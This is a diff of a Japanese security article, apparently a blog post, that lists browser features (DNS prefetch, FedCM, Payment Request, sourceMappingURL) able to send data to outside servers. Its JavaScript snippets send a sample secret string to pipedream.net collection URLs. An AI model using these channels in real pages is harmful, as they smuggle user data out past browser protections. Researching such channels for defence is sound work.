@@ -23,7 +23,7 @@
 送信するデータの例として文字列 `Satoki_no_himitsu` を用います。他の文字列でもbase64やhexに変換すれば、やることは変わりません。長さが問題であれば分割すれば良いです。
 
 ### DNS Prefetch
-ページ読み込みの速度向上のため、ブラウザが事前に名前解決を行う仕組みを利用します。HTML中に`<link rel="dns-prefetch" href="example.com">`と記述することで利用できます。ブラウザの設定で「ページをプリロードする」がoffの場合には利用できません。
+ページ読み込みの速度向上のため、ブラウザが事前に名前解決を行う仕組みを利用します。HTML中に`<link rel="dns-prefetch" href="URL">`と記述することで利用できます。ブラウザの設定で「ページをプリロードする」がoffの場合には利用できません。
 
 ```js
 var body = document.getElementsByTagName("body")[0];
@@ -50,14 +50,14 @@ p.setLocalDescription();
 受信したリクエスト  
 
 
-### FedCM
-IdPから認証情報を取得する際のリクエストURLを利用します。認証情報を保存する際のアイコンのURLとして情報を送信する手法も確認されていますが、ユーザにダイアログが出現するため今回はスコープ外とします。セキュアコンテキストでのみ利用できます。
+### Federated Credential Management
+IdPから構成情報を取得する際のリクエストURLを利用します。認証情報を保存する際のアイコンのURLとして情報を送信する手法も確認されていますが、ユーザにダイアログが出現するため今回はスコープ外とします。セキュアコンテキストでのみ利用できます。
 
 ```js
 await navigator.credentials.get({
     identity: {
         providers: [{
-            configURL: "https://enbx53nv6g23p.x.pipedream.net/" + "?text=Satoki_no_himitsu",
+            configURL: "https://enbx53nv6g23p.x.pipedream.net/?text=" + "Satoki_no_himitsu",
             clientId: "satoki",
         }, ],
     },
@@ -68,13 +68,13 @@ await navigator.credentials.get({
 受信したリクエスト  
 
 
-### PaymentRequest
+### Payment Request
 Payment Request APIのコンストラクタに決済手段としてURLを渡すことで、リクエストが発される仕組みを利用します。セキュアコンテキストでのみ利用できます。
 
 ```js
 new PaymentRequest(
     [{
-        supportedMethods: "https://envycdb25h1v.x.pipedream.net/" + "?text=Satoki_no_himitsu",
+        supportedMethods: "https://envycdb25h1v.x.pipedream.net/?text=" + "Satoki_no_himitsu",
     }, ], {
         total: {
             label: "total",
@@ -91,7 +91,7 @@ new PaymentRequest(
 受信したリクエスト  
 
 ### sourceMappingURL
-ブラウザがminifyなどされる前のソースコードを取得する機能である、SourceMapを利用します。開発者ツールを開いた場合 (Firefoxではデバッグタブを開いた場合) にのみリクエストが発生します。
+ブラウザがminifyなどされる前のソースコードを取得するSourceMapを利用します。HTML中に`<script>//# sourceMappingURL=URL</script>`と記述することで利用できます。開発者ツールを開いた場合 (Firefoxではデバッグタブを開いた場合) にのみリクエストが発生します。
 
 ```js
 var script = document.createElement("script");
